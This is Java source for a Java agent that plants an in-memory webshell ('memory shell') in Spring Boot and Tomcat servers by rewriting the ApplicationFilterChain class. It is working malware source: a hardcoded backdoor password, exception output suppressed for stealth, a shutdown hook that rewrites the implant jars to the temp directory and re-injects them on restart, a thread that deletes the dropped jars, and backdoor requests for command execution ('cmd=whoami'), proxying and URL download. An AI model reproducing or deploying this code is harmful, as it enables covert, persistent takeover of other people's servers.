package me.mole;

import javassist.bytecode.annotation.NoSuchClassError;
import me.mole.transform.Transformer;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.Query;
import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.Set;

public class AgentEntry {

    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
    public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};
    public static String currentPath;
    public static String password = "m01e";
    public static String targetSbJarNameWithoutSuffix;

    public static void agentmain(String agentArgs, Instrumentation inst) {
        //先访问一次目标http服务.
        // 这主要是针对目标Tomcat重启后,agent加载到Tomcat进程的情况：
        //   如果不先访问一次，重启后Tomcat的ApplicationFilterChain类不会被加载到内存中，
        //   所以在下面的字节码修改操作之前，会找不到这个类，从而agent内存马注入失败.
//        initAccess();

        inst.addTransformer(new Transformer(), true);
        if (agentArgs.indexOf("^") >= 0) {
            AgentEntry.currentPath = agentArgs.split("\\^")[0];
            AgentEntry.password = agentArgs.split("\\^")[1];
            AgentEntry.targetSbJarNameWithoutSuffix = agentArgs.split("\\^")[2];
        } else {
            AgentEntry.currentPath = agentArgs;
        }
        System.out.println("Agent Main Done");
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class c : loadedClasses) {
            if (c.getName().equals(className)) {
                System.out.println("------ " + className + " -------");
                try {
                    inst.retransformClasses(c);
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        try {
            //对memshell初始访问，避免后面删掉agent.jar后一些memshell相关的类
            // 没有加载到内存中，从而造成访问memshell时出现ClassNotFoundException
//            initLoad();

            readInjectFile(AgentEntry.currentPath);
            readAgentFile(AgentEntry.currentPath);
//            clear(AgentEntry.currentPath);
        } catch (Exception e) {
            // 为了隐蔽,不要打印异常信息
        }
        //agent内存马持久化
//        AgentEntry.persist();
    }

    public static void persist() {
        try {
            Thread t = new Thread() {
                public void run() {
                    try {
                        //在目标JVM进程关闭前，
                        //  将agent内存马的inject包和agent包写入到临时目录
                        writeFiles("AgentSpringbootMemShellInject.jar", AgentEntry.injectFileBytes);
                        writeFiles("AgentSpringbootMemShell.jar", AgentEntry.agentFileBytes);
                        //开启agent内存马的注入操作，待目标JVM进程启动后便可注入成功.
                        startInject();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            //对JVM进程的关闭操作进行hook
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {

        }
    }

    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();
    }

    public static void readInjectFile(String filePath) throws Exception {
        String fileName = "AgentSpringbootMemShellInject.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "AgentSpringbootMemShell.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void startInject() throws Exception {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "AgentSpringbootMemShellInject.jar " + AgentEntry.password + " " + AgentEntry.targetSbJarNameWithoutSuffix;
        Runtime.getRuntime().exec(cmd);
    }

//    public static void main(String[] args) {
//        try {
//            readAgentFile("e:/");
//            String tempPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
//
//            String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath().substring(0,
//                    tempPath.lastIndexOf("/"));
//        } catch (Exception e) {
//            // TODO Auto-generated catch block
//            e.printStackTrace();
//        }
//    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            totalLength += byteArray[i].length;
        }

        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
        }

        return result;
    }

    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = AgentEntry.currentPath;

            public void run() {
                try {
                    Thread.sleep(5000);
                    String injectFile = currentPath + "AgentSpringbootMemShellInject.jar";
                    String agentFile = currentPath + "AgentSpringbootMemShell.jar";
                    new File(injectFile).getCanonicalFile().delete();
                    String OS = System.getProperty("os.name").toLowerCase();
                    if (OS.indexOf("windows") >= 0) {
                        //TODO: unlockfile
                    }
                    new File(agentFile).delete();
                } catch (Exception e) {
                    //pass
                }
            }
        };
        clearThread.start();

    }


    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }

    public static void initAccess() {
        while (true) {
            try {
                //这里端口是写死的，所以并没有真正实现在Attach到
                //Springboot的进程之后获取tomcat的端口号。
                //试了很多方法都不行，因为attach之后，agent所在的线程
                //获取不到ApplicationContext上下文，从而无法获取到端口号.
                String port = "8888";
                String host = "127.0.0.1";
                String url = "http" + "://" + host + ":" + port;
                String address = url + "/api/noexist/test";
                openUrl(address);
                break;
            } catch (Throwable e) {
//                e.printStackTrace();
                if (e instanceof java.net.ConnectException || e instanceof java.lang.ClassNotFoundException) {
                    System.out.println("Sorry, The server is starting. Please try to inject again later.");
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException interruptedException) {
                        interruptedException.printStackTrace();
                    }
                    continue;
                } else {
                    System.out.println("Ok, The server started!!!");
                    break;
                }
            }
        }
    }

    /**
     * 该方法在Springboot的环境下并不适用
     * @throws Exception
     */
    public static void initLoad() throws Exception {
        try {
            MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
            Set<ObjectName> objectNames = beanServer.queryNames(new ObjectName("*:type=Connector,*"),
                    Query.match(Query.attr("protocol"), Query.value("HTTP/1.1")));
            //String host = InetAddress.getLocalHost().getHostAddress();
            String host = "127.0.0.1";
            String port = objectNames.iterator().next().getKeyProperty("port");
            String url = "http" + "://" + host + ":" + port;
            String[] models = new String[]{"model=exec&cmd=whoami", "model=proxy", "model=chopper", "model=list&path=.",
                    "model=urldownload&url=https://www.baidu.com/robots.txt&path=not_exist:/not_exist"};
            for (String model : models) {
                String address = url + "/robots.txt?" + "pass_the_world=" + AgentEntry.password + "&" + model;
                openUrl(address);
            }
        } catch (Exception e) {
            //pass
        }
    }

    public static void openUrl(String address) throws Exception {
        System.out.println("ACCESS_ADDRESS::: " + address);
        URL url = new URL(address);
        HttpURLConnection urlcon = (HttpURLConnection) url.openConnection();
        urlcon.connect(); // 获取连接
        InputStream is = urlcon.getInputStream();
        BufferedReader buffer = new BufferedReader(new InputStreamReader(is));
        StringBuffer bs = new StringBuffer();
        String l = null;
        while ((l = buffer.readLine()) != null) {
            bs.append(l).append("\n");
        }
    }
}